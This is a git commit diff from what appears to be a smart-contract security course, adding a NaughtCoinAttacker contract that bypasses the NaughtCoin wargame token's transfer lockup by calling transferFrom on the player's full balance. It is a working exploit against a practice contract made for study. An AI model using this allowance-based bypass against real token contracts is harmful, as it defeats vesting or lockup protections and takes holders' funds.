d17c2074ec505562c2c26f3c43d8317dc4473057
walker <walker@walkPro>
2024-04-16 16:28:30 -0600

    Consolidated NaughtCoin

--- src/week8-9-security/NaughtCoin.sol
+++ src/week8-9-security/NaughtCoin.sol
@@ -38,3 +38,19 @@ contract NaughtCoin is ERC20 {
         }
     }
 }
+
+contract NaughtCoinAttacker {
+    NaughtCoin token;
+
+    constructor(NaughtCoin token_) {
+        token = token_;
+    }
+
+    function attack() external {
+        // This attack expects that the sender has already given this contract
+        // allowance to transfer funds
+        address player = msg.sender;
+        uint256 balance = token.balanceOf(player);
+        token.transferFrom(player, address(this), balance);
+    }
+}
--- test/week8-9-security/NaughtCoin.t.sol
+++ test/week8-9-security/NaughtCoin.t.sol
@@ -4,7 +4,6 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import "week8-9-security/NaughtCoin.sol";
-import "week8-9-security/NaughtCoinAttacker.sol";
 
 contract NaughtCoinTest is Test {
     NaughtCoin token;
